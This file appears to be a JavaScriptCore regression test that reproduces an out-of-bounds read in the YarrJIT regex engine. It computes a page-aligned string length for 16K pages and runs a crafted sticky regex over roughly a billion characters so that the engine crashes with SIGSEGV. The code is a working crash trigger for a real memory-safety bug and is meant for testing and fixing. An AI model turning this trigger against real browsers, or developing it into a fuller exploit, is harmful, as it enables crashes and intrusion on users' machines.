//@ skip if $memoryLimited

// YarrJIT OOB crash — page-aligned variant
//
// sizeof(StringImpl) = 0x14, page_size = 0x4000 (Apple Silicon 16K pages)
// Solve: 0x14 + (K + 0x40000000)*2 ≡ 0 (mod 0x4000)  →  K = 0x1FF6
//
// Pattern: \u0100{K} [\u0100] \u0100{0x3FFFFFFF}    flags: y
// Subject: "\u0100".repeat(K + 0x40000000)
//
// The OOB ldrh lands at alloc_base + page_size*N exactly → unmapped → SIGSEGV

"use strict";

const K     = 0x1FF6;
const LEN   = K + 0x40000000;   // 0x40001FF6
const QUANT = 0x3FFFFFFF;

// allocate
let s;
try {
    s = "\u0100".repeat(LEN);
} catch (e) {
    print("[!] OOM: " + e);
    quit();
}
if(s.length !== 0x40001ff6) throw new Error("unexpected s.length "+s.length);

let pattern = "\\u0100{" + K + "}[\\u0100]\\u0100{" + QUANT + "}";
let re = new RegExp(pattern, "y");
re.lastIndex = 0;

re.test(s); // should SIGSEGV if the bug is present
